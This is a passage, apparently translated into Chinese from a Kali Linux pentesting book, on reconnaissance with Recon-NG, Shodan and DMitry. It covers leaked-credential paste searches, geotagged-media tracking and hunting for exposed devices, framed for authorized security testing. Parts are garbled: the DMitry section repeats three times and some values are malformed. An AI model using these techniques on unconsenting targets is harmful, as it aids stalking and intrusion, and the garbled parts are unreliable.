用法 keys [list|add] | 添加特定密钥
```

使用 **keys add [manufacturer] [api key]** 添加 API 密钥。执行模块时，Recon-NG 将使用 API 密钥与相应的服务。

## 从受攻击的站点列表中恢复数据

Recon-NG 的另一个有趣功能是它可以搜索“Pwned”站点列表，寻找系统被攻破的公司。黑客在攻破主机后公开投放数据是一个常见趋势。这可能包括从公司内部信息到泄露的数据库和用户凭据的一切内容。系统管理员也使用 Pastebin 作为临时存储处在处理系统问题时存储笔记。




通常情况下，你可能仍然可以在这些网站上找到关于目标的一些有趣信息，供世界看到。

Recon-ng 有多个模块可用于搜索这些网站，以查看目标的信息是否已被泄露或发布。例如，让我们使用“Have I been pwned: Paste Search”模块来查找已知的电子邮件地址。

输入，**use recon/contacts-credentials/hibp-paste**
然后输入，**"show info"**：

```
[recon-ng][default][hibp_paste] > show info
Name: Have I been pwned? Paste Search
Path: modules/recon/contacts-credentials/hibp_paste.py
Author: Tim Tomes @LANMasterER53
Description:
Leverages the havebeenpwned.com API to determine if email addresses have been
paste sites. Also compromised email addresses to the 'credentials' table.
Options:
Name           Current Value Required Description
------ ---------- ------- -----------
DOWNLOAD       True        yes      download pastes
SOURCE         default     yes      source of input (see 'show info' for detail)
```

该模块使用 havebeenpwned.com 的 API 在 Pastebin、Paisley 或 Slex 上搜索泄露的凭据。我们需要做的是将 **SOURCE** 设置我们想要的电子邮件地址并运行该模块。**"DOWNLOAD"** 变量设置为 'true'，这将自动下载找到的任何泄露文本（paste）。

如所示：

```
[recon-ng][default][hibp_paste] > SOURCE test@example.com
SOURCE => test@example.com
[recon-ng][default][hibp_paste] > run
* test@example.com => Paste found! Seen in Pastebin on 2018-03-18T21:02:07Z
(http://pastebin.com/raw.php?id=girmpjdy)
paste stood at '/root/.recon-ng/workspaces/default/httppastebincomrawphpg1
* test@example.com => Paste found! Seen in Pastebin on 2018-02-14T14:19:48
(http://pastebin.com/raw.php?id=62HRnYS0)
paste could not be downloaded (http://pastebin.com/raw.php?id=62HRnYS0)
* test@example.com => Paste found in Pastebin on 2018-02-14T14:19:168
(http://pastebin.com/raw.php?id=JueYehj)
paste could not be downloaded (http://pastebin.com/raw.php?id=JueYehj)
* test@example.com => Paste found! Seen in Pastebin on 2018-01-25T14:33:39Z
(http://pastebin.com/raw.php?id=LCKWK6ZX)
paste stood at '/root/.recon-ng/workspaces/default/httppastebincomrawphpiLC
6KW6ZX
* test@example.com => Paste found! Seen in Pastebin on 2018-01-24T16:50:23Z
(http://pastebin.com/raw.php?id=dWvNJGhk)
```

我们可以浏览到列出的 Pastebin 地址在线查看，也可以在 recon-ng 工作目录中查看保存的文本文件：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_59_0.png)

可以在 Firefox 中点击这些 .txt 文件进行查看。

## 高级 Recon-NG: Pushpins

Pushpins 是 Recon-NG 中一个非常有信息且有时令人毛悚的功能。它允许你在多个社交媒体网站上搜索带有地理标记或位置标记的媒体。工具作者的视频详细解释了这一功能：

"Recon-ng - Pushpin Intro" - https://www.youtube.com/watch?v=BwopO7dxT98

此外，我们在这里只介绍重点。首先，我们将为 Pushpins 创建并使用一个“test2”数据库：

在 recon-ng 提示符下输入，“workspaces add test2”。注意提示符发生了变化，反映我们正在使用 test2 数据库。现在我们需要设置目标区域的位置。

输入，“add locations"
现在，在提示提示时输入目标的纬度和经度（除非你知道它们）
接着在‘Street Address’提示处输入目标的完整街道地址（我使用了纽约大中央的地址）
我们现在需要将街道地址转换为纬度和经度。

输入，“load recon/locations-locations/geocode”

输入，“run"
地理编码模块将获取街道地址并为我们转换为纬度和经度。然后它会将此新信息添加到数据库中。通过输入 "show locations"可以看到：

```
[recon-ng][test][geocode] > show locations
| rowid | latitude | longitude | street_address |
| 2 | 40.7524961 | -73.977302 | 89 E 42nd St, New York, NY 10017 |
```

设置位置后，让我们使用 Pushpin 模块为目标收集数据。

输入，“search-pushpins”查看可用模块：

```
[recon-ng][test][geocode] > search-pushpins
[*] Searching for 'pushpins'...
---
Recon
recon/locations-pushpins/flickr
recon/locations-pushpins/instagram
recon/locations-pushpins/picasa
recon/locations-pushpins/shodan
recon/locations-pushpins/twitter
recon/locations-pushpins/youtube
```

使用 Picasa 以外的任何 Pushpin 模块都需要 API 代码。虽然 Picasa 仍在模块列表中，但 Google 已经在 2016 年 3 月关闭了这项服务。

Pushpin 的用法与其他任何模块一样：

输入，“load recon/locations-pushpins/[module]”
然后输入，“run”
下面的截图显示“Shodan”模块正在运行：

```
[recon-ng][test2][shodan] > run
---
40.7524961,-73.977302
[*] Searching Shodan API for geo:40.7524961,-73.977302
[*] Latitude: 40.7584
[*] Longitude: -73.9794
```

模块运行时，位置坐标的所有数据将进入 recon-ng 数据库。

运行完成后，输入 "show dashboard"：

| Category | Quantity |
| --- | --- |
| Domains | 0 |
| Companies | 0 |
| Netblocks | 0 |
| Locations | 2 |
| Vulnerabilities | 0 |
| Ports | 0 |
| Hosts | 0 |
| Contacts | 0 |
| Credentials | 0 |
| Leaks | 0 |
| Pushpins | 101 |
| Profiles | 0 |
| Repositories | 0 |

```
[recon-ng][test2][shodan] >
```

现在 Pushpins 表中共有 101 条条目。我们现在可以使用 pushpin 报告功能来查看这些信息。

输入，“load reporting/pushpin”
输入，“show options”

我们需要手动设置 LATITUDE 和 LONGITUDE。



```bash
root@kali:~# recon-cli -h
usage: recon-cli [-h] [-V] [-w workspace] [-C command [-c command] [-G]
       [-g name=value] [-M] [-m module] [-O] [-o name=value] [-x]
       --no-check]

recon-cli - Tim Tomes (@LaNMaSteR53) tjt1980[at]gmail.com
optional arguments:
  -h, --help show message and exit
  -v, --version show program's version and exit
  -w workspace load/create workspace
  -C command runs a command at the global context
  -c command runs a command at the module context (pre-run)
  -G show available global options
  -g name=value set a global option (can be used more than once)
  -M module specify the module
  -o show available module options
  -name=value set a module option (can be used more than once)
  -x run the version check
  --no-check disable version check
```

这些开关都是一而易见的，因此我将它们留作为一个选项供读者自行探索。

## 结论

正如我们在本章中所看到的，Recon-NG 是信息收集和侦察领域非常有价值的工具。在本章中仅涵盖了几个模块，但还有许多其他模块可以选择。当你使用 API 开发者密钥进行与 Web 服务相关的搜索时，Recon-NG 的功能会极大地扩展。例如，你可以搜索目标的 Twitter 推文，甚至通过 Shodan 搜索开放系统。虽然我们简要地提到了 Recon-NG 的某些功能，但它确实是一个令人印象深刻的工具，非常值得深入研究。我强烈建议读者花一些额外时间尝试不同的模块和功能。

## 资源

- Recon-NG Wiki 页面 - https://bitbucket.org/LaNMaSteR53/recon-ng/wiki/Home
- Recon-NG 更新回顾视频 - https://www.youtube.com/watch?y=VevMPCKd6aM

## 第5章
## Shodan

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_65_0.png)

**网站创始人：** John Matherly
**网站地址：** https://shodan.io/
**网站博客：** https://blog.shodan.io/

Shodan 是互联网上最惊人的网站之一。它被称为“黑客谷歌”、“黑暗谷歌”，并多次被形容为“恐怖”——它基本上是一个计算机的搜索引擎。Shodan 允许你通过搜索关键词、服务、端口、操作系统或位置来在互联网上找到计算机或设备。例如，你可以搜索加拿大境内所有的 Microsoft IIS 服务器，或者搜索非洲所有使用 Linux 的系统。它可以找到任何连接的服务器，无论是物理文件服务器、打印机、摄像头，还是可以从 Web 公开访问的物联网（IoT）设备。在本章中，我们将学习如何使用 Shodan 进行安全测试。

如果你熟悉“Google Dorks”（谷歌语法搜索），那么 Shodan 是一种更简单的方法，用于搜索整个互联网的目标。有效使用 Shodan 的诀窍在于知道正确的关键词。通常这些关键词是制造商名称或设备型号，但有时它们是非常冷门的嵌入式 Web 服务器名称。一旦你知道了正确的关键词，几秒钟就能在全球范围内搜索这些设备。通过使用过滤命令，你可以将搜索缩小到特定的网络、公司，甚至是运行在服务器上的软件版本。

安全团队可以使用 Shodan 快速评估其网络上的哪些系统正被公开显示，而这些系统本不应该是这样的。它还可以帮助他们发现添加到公司网络的异常或未经授权的设备。在本节中，我们将简要讨论为什么使用 Shodan 扫描网络空间是一个好主意。然后我们将查看如何从 Web 界面 Shodan.io 进行这些搜索，最后通过 Kali Linux 使用 Metasploit 框架。

## 为什么可以用 Shodan 扫描你的网络？

大量表面上不安全的系统本不应该在互联网上公开。通过 Shodan 几次关键词搜索，就可以轻松找到所有这些系统。从在线、过时且不安全的系统、路由器、网络存储和电话系统，到监控摄像头、建筑控制系统，甚至是安全系统。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_66_0.png)

将光标悬停在端口上可以获取更多信息。

但这并不是全部。开放的网络打印机和嵌入式设备也是黑客的信息源，它们会提供 SNMP 和网络基础设施信息，甚至可能还有用户账户和密码！

遗憾的是，在这个新的“物联网”世界中，计算机系统并不是唯一可以在网上找到的东西。诚然，你可以找到大型工业 HVAC 环境和建筑温度控制系统（完全开放且不安全），但你也可以找到其他不寻常设备，如在线鱼缸控制系统甚至远程控制门：

| 门 #1 | 门 #2 |
| :--- | :--- |
| 状态 IDLE | 状态 IDLE |
| 定器开启 | 定器开启 |
| 状态 Closed | 状态 Closed |
| 消息：门已关闭 | 消息：门在定时过期前已关闭 |
| 配置信息 | 运行时间 |
| 自动关闭定时 60 分钟 | 7 天 6 小时 35 分钟 45 秒 |
| 关闭失败定时 20 秒 | |

当在线设备具有安全性时，但制造商在出厂时默认是关闭的，用户只需要将其开启：

| 密码设置 |
| :--- |
| 关闭 |
| 新密码 |
| 确认新密码 |
| 新密码 |
| 确认新密码 |

当在线设备具有安全性，但制造商在出厂时默认是关闭的，用户只需要将其开启：

有些系统由于默认凭据被暴露在互联网上。

**警告：**
点击单个 Shodan 搜索结果标题有时会直接带你进入实时系统！永远访问或修改你没有明确许可的系统。

  搜索

在 Shodan 中执行基础搜索非常简单。只需在搜索栏中输入你想的内容并点击搜索按钮即可。搜索开放系统已变得非常流行。Shodan 本身有一个“探索”区域，用户可以在那里分享有趣的发现：

| 特色类别 | 高票数 | 最近分享 |
| :--- | :--- | :--- |
| 工业控制系统 | 网络摄像头 | admin |
| 数据库 | 摄像头 | 网络 |
| 视频游戏 | | | login |

## Shodan 功能

- Shodan 网站搜索
- Shodan 漏洞
- Shodan 地图
- Shodan 雷达

以及一些高级功能：

- Shodan 命令行界面
- 使用 Metasploit 进行 Shodan 搜索

## Shodan 网站搜索

要使用 Shodan，只需将你的浏览器指向 Shodan 网站 "shodan.io"：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_69_0.png)

你首先想做的是在网站创建一个账户。如果没有，你的搜索功能将受到限制。注册基础账户是免费的，并允许访问搜索结果和某些 API 功能。要访问所有功能，你需要购买会员。有多种方案，请访问 Shodan API 页面获取更多信息（https://developer.shodan.io/pricing）。本章至少需要一个免费账户。

**警告：**
点击单个 Shodan 搜索结果标题有时会直接带你进入实时系统！永远访问或修改你没有明确许可的系统。

### 基础搜索

在 Shodan 中执行基础搜索极其简单。只需在搜索栏中输入你想的内容并点击搜索按钮即可。所以，如果我们想搜索 Cisco 路由器：

输入 "cisco" 并点击“搜索”图标

Shodan 全范围内返回了超过百万台 Cisco 路由器。在页面主要部分，你会看到列出的单个设备结果。点击每个结果底部的“details”链接可以查看该设备的信息页。在屏幕左侧，Shodan 还会显示总设备中有多少来自特定国家或位置。




你可以点击任何国家来缩小你的搜索范围。例如，如果我们想查看中国境内所有的 Cisco 设备，可以点击“热门国家”（Top Countries）下的“中国”（China）。Shodan 现在向我们展示了中国 Cisco 路由器的热门城市结果：

这是一个非常实用的功能，但在缩小搜索范围时，你通常会直接使用过滤命令。实际上，如果你查看搜索栏，当你点击“中国”时，Shodan 自动在搜索行中输入了国家过滤器。搜索栏现在看起来应该是这样的：

## **cisco country:"CN"**

你可以看到国家过滤器使用了中国的两个字母国家代码。我们稍后会详细介绍过滤器的用法，但首先，让我们来看设备信息页面。在 Shodan 搜索界面的主体部分，我们列出了单独的各个。如果你点击其中一个结果的“详情”（Details）链接，你将看到关于该设备的更详细信息：

这包括设备的位置、常用端口和服务以及一个通用位置。你甚至可以放大地图并进行滚动。进行基础搜索非常有趣，但只有当你使用过滤器时，Shodan 的真正威力才会展现。

## 使用过滤器进行更高级搜索

使用过滤命令，你可以快速将搜索缩小到非常具体的项目。让我们仔细查看各个过滤器。再次提醒，要使用这些过滤器或获取超过一页的结果，你需要注册 Shodan 账号。

### 位置命令

Country（国家）、State（州）、City（城市）和 Postal（邮政）命令允许你缩小搜索的地理位置。

| 命令 | 示例 |
| --- | --- |
| Country | country:US |
| State | state:NY |
| City | city:Watertown |
| Postal | postal:02471 |

使用这些过滤器中的任何一个都可以根据地理位置搜索设备。如果你愿意，还可以组合各个过滤器：

### **country:US city:Memphis**

### 网络命令**

Org（组织）、Net（网络）、Hostname（主机名）和 Port（端口）命令允许你通过基于网络的过滤器缩小搜索。

| 命令 | 示例 |
| --- | --- |
| Org | org:Microsoft |
| Net | net:192.168.1.10<br>net:192.168.1.0/24 |
| Hostname | hostname:Microsoft.com<br>hostname:support.Microsoft.com |
| Port | port:445 |

**org** - 按名称搜索单个组织
**net** - 搜索单个 IP 地址或整个网段范围
**hostname** - 允许你使用完全限定域名名（FQDN）的部分部分，如 'google' 或整个站点如 'www.microsoft.com' 或 'support.microsoft.com'。
**port** - 按开放端口搜索系统

### 网页命令**

Title（标题）和 HTML 过滤器允许你通过基于网页的过滤器缩小搜索。

| 命令 | 示例 |
| --- | --- |
| Title | title:"Server Room" |
| Html | html:phpinfo.php |

*title* 过滤器可能是最被忽视的搜索参数之一。你可以扫描整个互联网或你的整个域名来寻找标题关键词。*html* 过滤器允许你在网页的 html 代码中扫描特定的单词或字符串。

| 命令 | 示例 |
| --- | --- |
| Os | os:Linux |
| Product | product:Apache |
| Version | version:1.6.2 |

这些过滤器命令允许你通过操作系统、产品类型或软件版本号进行搜索。

### 关键字搜索

搜索 Shodan 最流行的方法可能可能是使用正文关键字搜索。如果你知道目标系统使用的服务器类型、嵌入式服务器的名称，或者只想搜索“200 OK”网页，那么正文关键字搜索就是你的选择。

例如，如果你想找到运行 Apache 服务器版本 2.2.8 的所有服务器，且仅限开放的站点，或扫描时未返回错误的站点（“200 OK”站点），你可以使用以下关键词：

```
apache/2.2.8 200 ok
```

### 组合搜索

最有效的 Shodan 搜索是通过组合搜索词和过滤器完成的。通过几个关键词，你就可以搜索位于你波士顿地区运行 IIS/10.0 的所有 Microsoft 服务器。

## IIS/10.0 hostname:YourCompany.com city:Boston

或者，你可以对你的域名进行快速的安全扫描，以寻找需要更新的旧系统。例如，位于你法国域名内任何地方的 IIS/5.0 系统。

## IIS/5.0 hostname:YourCompany.com country:FR

标题搜索效果也非常好。许多摄像头在标题信息中使用了“camera”。如果你的网络不允许使用摄像头，你可以快速检查这一点。

## title:camera hostname:YourCompany.com

## 其他有趣的过滤器

使用地理坐标进行搜索开启了一些特殊功能，特别是对于操作系统（OS）。由于某些原因，并不是每个系统都被正确标记。

“after”（之后）和“before”（之前）允许你按日期搜索：

### after:15/2017
### before:15/2017

最后，“has_screenshot”显示哪些内容带有截图：

### has_screenshot:true

地理过滤器开启了一些有趣的功能。假设你想搜索大马士革附近的系统：

（注：原文中的图像未根据标准 OCR 后处理包含在输出中，除非它们是表格，但周围的文本被保留了。）

## 汇总

现在我们已经知道了可用的过滤器，它们如何被使用？这里有一个示例结果：

| 1. Title: Microsoft Corporation | HTTP/1.1 200 OK |
|---|---|
| 157.56.62.28 | Cache-Control: no-cache |
| Microsoft Corp | Content-Type: text/html |
| Date: 18/07/2013 | Last-Modified: 16 Mar 2009 20:55:26 GMT |
| 2. Country | Accept-Ranges: bytes |
| [US Flag] | ETag: "679f431d-b6c11e.0" |
| 3. Hostname: | Server: Microsoft IIS/7.5 |
| www.codetest.com | Vary: 4387438800000 |
| 4. Body Text area | X-Powered-By: ASP.NET |
| | Date: 18 Jul 2013 23:42:58 GMT Content-Length: 1020 |

我们已经涵盖了许多基础信息。这足够让你开始执行有效的搜索了。花时间尝试不同的过滤器，直到你熟悉它们。法则是：你的公司网络越大，发现你不知道在互联网上的、或不该出现在互联网上的系统的概率就越高。

使用 Shodan 在线查找系统非常简单 - 请始终记住，在没有获得明确许可的情况下访问或操纵系统是违法的。

## Shodan 网站其他功能

现在让我们花几时间探索 Shodan 网站其他令人兴奋的功能。要查看可用选项菜单，你只需



点击 Shodan 网页顶部的“查看全部... (View All...)”菜单项，如下所示：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_77_0.png)

你将看到一个可用功能列表。我们将在下一节快速查看其中一些功能。

## Shodan 漏洞 (Shodan Exploits)

由于 Shodan 搜索可以帮助你发现在线上的漏洞系统，而 Shodan Exploits 提供了一个数据库，帮助你了解现有漏洞甚至学习如何利用它们。Shodan Exploits 非常简单，只需访问 Shodan 网站的“Exploits（漏洞）”部分，输入你想检查的软件或系统的搜索词，它将返回来自三个主要漏洞数据库的链接：

- CVE
- ExploitDB
- Metasploit

因此，要找到 IIS 列出的漏洞，只需输入“IIS”并点击“搜索”：

## Shodan 漏洞

| 来源 | 数量 |
| --- | --- |
| cve | 197 |
| exploitdb | 121 |
| metasploit | 17 |
| 平台 | |
| windows | 112 |
| Windows | 17 |
| multiplix | 8 |
| linux | 1 |
| 类型 | |
| 远程 | 93 |
| dos | 20 |
| exploit | 17 |
| 本地 | 6 |
| webapps | 2 |

> 使用长 URL 在 IIS 中导致拒绝服务..
>
> 安装了修复补丁的 IIS 3.0 允许入侵者读取 IIS 3.0 的源代码，x86 和 Alpha 上的 IIS 4 允许远程攻击者导致拒绝服务。
> IIS 为服务器端包含 (SSI) 文件启用了 #exec 函数。
> 使用.. 在 Windows NT IIS 服务器中导致拒绝服务。
> IIS 1.0 用户可以使用 .bat 或 .cmd 文件执行任意命令。
> new.exe CGI 脚本允许远程用户覆盖文件。

Shodan Exploits 为不同版本的 IIS 返回了超过 300 种可能的漏洞。然后你可以使用左侧菜单按来源 (Source)、平台 (Platform) 或类型 (Type) 查找漏洞信息，或者直接点击主菜单中的任何链接。（在编写本文时，某些链接指向了不存在的页面）

## Shodan 地图 (Shodan Maps)

Shodan Maps 为 Shodan 搜索提供了一个精美的图形化界面，将返回结果显示在全球地图上。当你输入搜索词时，所有结果都列在屏幕左侧，单个结果会像下面所示在世界地图上进行精确定位标记：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_79_0.png)

你可以像使用任何普通地图程序一样导航并缩放。如果你点击任何标记点，将获得返回结果的小型统计缩略图。如果点击“查看详情 (View Details)”，你将看到关于该系统的常规 Shodan 信息屏幕。

## Shodan ICS 雷达 (Shodan ICS Radar)

Shodan ICS（工业控制系统）雷达与其说是一个功能性工具，不如说是一个信息图，但它仍然非常有趣。ICS Radar 展示了全球范围内可以直接访问的工业控制系统。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_79_1.png)

随着全球对“网络战争”关注的增加以及对有漏洞 ICS 设备的特定针对，这个信息网站让你对问题的规模有了概念。

## Shodan 图像 (Shodan Images)

在继续之前，我只想快速地提一下 Shodan 的“图像搜索 (Image Search)”。
你可以用它快速找到任何 Shodan 存储了截图的在线系统。通常，这些是开启的网络摄像头，或者是关闭了身份验证的 RDP 和 VNC 系统。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_80_0.png)

在进行常规 Shodan 网页搜索时，只需使用 `has_screenshot:true` 搜索过滤器即可找到相同的信息，但 Shodan Images 搜索会一次在屏幕上列出所有截图图像。如果你参加安全会议，可以将其想象成类似于“耻辱墙 (Wall of Shame)”的展示。遗憾的是，你仍然可以通过 Shodan 找到开放的楼宇控制界面、安全网络摄像头、销售点系统 (POS)，以及数千个运行 VNC 和 RDP 的系统。这就是为什么保护任何连接到互联网的设备至关重要，整个世界字面上都在看着。

## Shodan 80 时代黑客界面

我不确定这会存在多久，但它最近被添加到了 Shodan 网站。可以通过 "https://2000.shodan.io" 查看，别忘记开启音乐以获得效果：

## 使用 Shodan 的高级方法

酷起来！（Rock on!）

现在我们已经查看了 Shodan 的一些基本功能，让我们花几分钟看看一些与 Shodan 交互的更高级的方法。如果你还不习惯安装应用和使用命令行，或者不熟悉 Metasploit，你可能想跳过本章的其余部分，以后再回来。

## Shodan 命令行 (Shodan CLI)

Shodan CLI 或“命令行界面”提供了一种从终端提示符执行 Shodan 搜索的方法。Kali 默认没有安装 Shodan CLI，需要手动安装。你还需要使用你的 API 密钥初始化程序。完整的使用说明位于 https://cli.shodan.io/，因此我将快速介绍。

在终端提示符下，输入 `easy_install shodan`

```
root@kali # easy_install shodan
Searching for shodan
Reading https://pypi.python.org/simple/shodan/
Downloading https://files.pythonhosted.org/packages/n1fcfedda1bc4f8550625ac2fc2722e3fa786/shodan-1.7.7
e7050edf79bb853dbbb938cda9b594abe87f040c6ae4eb7b7
best match: downloaded 1.7.7
Processing shodan-1.7.tar.gz
```

然后，输入 `shodan init <api key>`

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_81_0.png)

你的 Shodan API 密钥位于 Shodan 网站的“我的账户 (My Account)”部分。当安装 `-h` 完成后，你现在准备好使用 Shodan CLI 了。

输入 `shodan -h` 查看帮助菜单：

```
root@kali:~# shodan
Usage: shodan [OPTIONS] COMMAND [ARGS]

Options:
  -h, --help 显示此消息并退出。

Commands:
  alert      管理你账户的网络警报
  convert    将给输入文件转换为...
  count      返回搜索结果的数量
  data       上传数据访问到 Shodan
  download   下载搜索结果并...
  honeystore 检查 IP 是否为蜜罐
  host       查看关于 IP 的可用信息
  info       显示关于账户的一般信息
```

你现在可以从命令行提示符运行 Shodan。例如，你可以使用 `host` 命令扫描特定的：

```
root@kali:~# shodan host 99.999.999
Hostnames:      mail.fakedom.ru
City:           Moscow
Country:        Russian Federation
Organization:   Media Center
Number of open ports: 1
Vulnerabilities: CVE-2014-0231 CVE-2015-0204
Ports:          80 nginx
```

Shodan 返回关于目标和开放端口的信息。注意 Shodan 并不总是列出所有系统的漏洞。如果没有列出，并不意味着没有问题。

-5. 现在设置你想要搜索的关键词：

## 使用 Metasploit 进行 Shodan 搜索

Shodan 搜索功能包含在 Metasploit 中。使用 Shodan API 密钥允许你在 Metasploit 内部进行自动执行的 Shodan 搜索。如果你不知道如何使用 Metasploit，不要担心，我们将在后面的章节中详细介绍。

要使用 Metasploit 查找系统，只需像使用任何漏洞一样使用：

通过 Kali 的 Metasploit 图标启动 Metasploit。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_83_0.png)

```
= [ metasploit v8.10.48]
+ 193 exploits - 100 auxiliary - 302 post
+ 536 payloads - 68 encoders - 10 nops
+ Free Metasploit 试用: http://r-7.co/trymps
```

2. 在 msf 提示符下输入 `use auxiliary/gather/shodan_search`：

```
msf > auxiliary/gather/shodan_search
msf auxiliary(gather/shodan_search) >
```

3. 现在，输入 `show options` 查看我们需要使用哪些选项：

```
msf auxiliary(gather/shodan_search) > show options
Module options (auxiliary/gather/shodan_search):
```

| 名称 | 当前设置 |  | 描述 |
| --- | --- | --- | --- |
| DATABASE | false |否 | 将搜索结果添加到 |
| MAXPAGE | 1 | 是 | 最大存储页面数 |
| OUTPUT | |否 | 格式的文件名 |
| Proxies | |否 | 代理链格式 |
| QUERY | | 是 | 想要搜索的关键词 |
| REGEX | * | 是 | 使用正则表达式搜索 |
| SHODAN_APIKEY | | 是 | Shodan API 密钥 |

4. 输入 `set SHODAN_APIKEY <API 密钥数字>` 并填入你的 API 密钥数字。



```
msf auxiliary(gather/shodan_search) > set QUERY iomega
QUERY => iomega
```

- 6. 现在只需输入 "run"。

- 7. 几秒钟后你将看到简短的统计返回，然后是找到的系统：

```
msf auxiliary(gather/shodan_search) > run
[*] Total: 22043 on 221 pages. Showing: 1 page(s)
[*] Collecting data, please wait...

Search Results
============
| IP:Port | City | Country |
|---|---|---|
| | Melbourne | Australia |
| | La Cuvière | Belgium |
| Lexington | United States |
| Lexington Central District | Hong Kong |
| Milan | Italy |
```

你可以使用‘set’ 命令选项来更改搜索页返回的最大数量，或将数据存储到文件或数据库中。如果这看起来有点令人困惑，不要担心，我们稍后会详细详细介绍如何使用 Metasploit。

## 结论

在本节中，我们讨论了 Shodan 搜索引擎。我们涵盖了如何使用关键词和过滤器在 Shodan 中进行搜索。接下来，我们查看了 Shodan 的一些新功能，最后我们看到了如何在 Kali 内部使用 Shodan 界面和 Metasploit 搜索 Shodan。遗憾的是，有数千甚至数百万未安全或已安全的系统可以通过 Shodan 轻松找到。公司了解自己有哪些系统在网络上公开可用是至关重要的。公司越大，其在网路上暴露的过时、开放或安全措施不足的系统就越常见。Shodan 是发现这些设备的快速简便的方法。我强烈建议企业安全团队（即使是小型企业和家庭用户）在 Shodan 中搜索他们的 IP 空间，以查看有哪些系统在网络上公开可用。

## 资源

Shodan 网站 - [https://www.shodan.io/](https://www.shodan.io/)

Shodan 博客 - [https://blog.shodan.io/](https://blog.shodan.io/)

Google Dorks 数据库 - [http://www.exploit-db.com/google-dorks/](http://www.exploit-db.com/google-dorks/)

# 第 6 章

## 额外的侦察工具

我们将通过快速查看 Kali 中包含的一些可用于情报收集或侦察的额外工具来结束侦察章节。由于这更像是一个参考章节，我们将简要介绍这些工具。这些工具可以直接从“应用程序 (Applications) > 01 - 信息收集 (Information Gathering)”菜单获取。通过点击快速访问栏上的“显示应用程序 (Show Applications)”按钮然后点击“01 - 信息收集”，可以访问扩展的信息收集部分：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_86_0.png)

此外，许多工具只需通过在终端提示符中输入工具名称即可运行。如果你不知道工具的完整名称，可以在终端中使用“Tab” 键补全。只需开始输入工具名称并按 Tab 键。按 Tab 键将列出所有以输入输入开头的命令。

例如：

```
root@kali:~# nets <tab> <tab>
netsed netsiff-ng netstat
```

现在你已经知道在哪里找到侦察工具了，让我们来看其中几个。

> ### 提醒：
> 作为安全测试人员，在实际安全测试中使用工具之前，你应该确保自己理解了该工具。某些工具可能会返回超出范围或不符合约定测试条款的信息，因此不应使用它们。

## DMitry

工具作者：James Greig

工具网站：http://mor-pah.net/software/dmitry-deepmagic-information-gathering-tool/

DMitry 或“Deepmagic 信息收集工具”负责收集有关目标系统尽可能多的信息。这包括子域名、电子邮件地址、服务器信息等：

```
### dmitry
Deepmagic Information Gathering Tool
There be some deep magic going on
Usage: dmitry -w $host.txt [-0-9] [-o host.txt]
-o 将输出保存到 -o 指定的文件中
-i 对主机的 IP 地址执行 whos 查找
-w 对主机的域名执行 whos 查找
-n 获取主机在 Netcraft.com 上的信息
-s 对子域名进行搜索
-e 对可能的电子邮件地址进行搜索
-f 对主机进行 TCP 扫描
-b 对主机进行 TCP 扫描并显示经过 过滤的输出
-ts 读取从扫描端口接收到的 banner
-t 0-9 设置扫描 TCP 端口时的 TTL 秒数（默认 2 ）
*需要：传递 -p 标记
DMitry=#
```

该工具可以通过 Whols 查找返回主机信息，并从 Netcraft.com 获取主机数据。与 Recon-NG 一样，DMitry 也会搜索目标可能的子域名并恢复电子邮件地址。此外，该工具具有执行 TCP 扫描的能力。

要启动它，只需从“应用程序 (Application) > 信息收集 (Information Gathering)”菜单或通过命令行输入“dmitry”即可运行 DMitry。这会自动显示帮助屏幕（见上图）。

基本用法：运行 DMitry，包含任何你需要的开关并提供目标地址。例如，要查找子域名：

### 输入; dmitry -s <Target Website>":

```
rootkali:~# # dmitry -s microsoft.com
Deepmagic Information Gathering Tool
"There are some deep magic going on"

HostIP:23.96.52.53
Hostname:microsoft.com
---------------------------
Gathered Subdomain information for microsoft.com
Searching Google.com:80...
Hostname:www.microsoft.com
HostIP:104.16.92.218
Hostname:support.microsoft.com
HostIP:184.50.218.21
Hostname:alogs.microsoft.com
HostIP:23.96.115.47
Hostname:mdn.microsoft.com
HostIP:132.58.168.19
Hostname:windows.microsoft.com
HostIP:134.170.119
```

获取 whos 信息，“dmitry -w [Target Website]”或端口扫描，“dmitry -p [IP Address or Target Website]":

```
rootkali:~# # dmitry -p 192.168.1.1
Deepmagic Information Gathering Tool
"There are some deep magic going on"

HostIP:192.168.1.1
Hostname:
---------------------------
Gathered Subdomain information for 192.168.1.1
---------------------------
Port        State
21          open
```

该工具可以通过 Whols 查找返回主机信息并从 Netcraft.com 获取主机数据。与 Recon-NG 一样，DMitry 也会搜索目标可能的子域名并恢复电子邮件地址。此外，该工具具有执行 TCP 扫描的能力。

要启动它，只需从“应用程序 (Application) > 信息收集 (Information Gathering)”菜单或通过命令行输入“dmitry”。这会自动显示帮助屏幕（见上图）。

基本用法：运行 DMitry，包含任何你需要的开关并提供目标地址。例如，要查找子域名：输入; dmitry -s <Target Website>":

```
rootkali:~# # dmitry -s microsoft.com
Deepmagic Information Gathering Tool
"There are some deep magic going on"

HostIP:23.96.52.53
Hostname:microsoft.com
---------------------------
Gathered Subdomain information for microsoft.com
Searching Google.com:80...
Hostname:www.microsoft.com
HostIP:104.16.92.218
Hostname:support.microsoft.com
HostIP:184.50.218.21
Hostname:alogs.microsoft.com
HostIP:23.96.115.47
Hostname:mdn.microsoft.com
HostIP:132.58.168.19
Hostname:windows.microsoft.com
HostIP:134.170.119
```

获取 whos 信息，“dmitry -w [Target Website]”或端口扫描，“dmitry -p [IP Address or Target Website]":

```
rootkali:~# # dmitry -p 192.168.1.1
Deepmagic Information Gathering Tool
"There are some deep magic going on"

HostIP:192.168.1.1
Hostname:
---------------------------
Gathered Subdomain information for 192.168.1.1
---------------------------
Port        State
21          open
```

该工具可以通过 Whols 查找返回主机信息并从 Netcraft.com 获取主机数据。与 Recon-NG 一样，DMitry 也会搜索目标可能的子域名并恢复电子邮件地址。此外，该工具具有执行 TCP 扫描的能力。

要启动它，只需从“应用程序 (Application) > 信息收集 (Information Gathering)”菜单或通过命令行输入“dmitry”。这会自动显示帮助屏幕（见上图）。

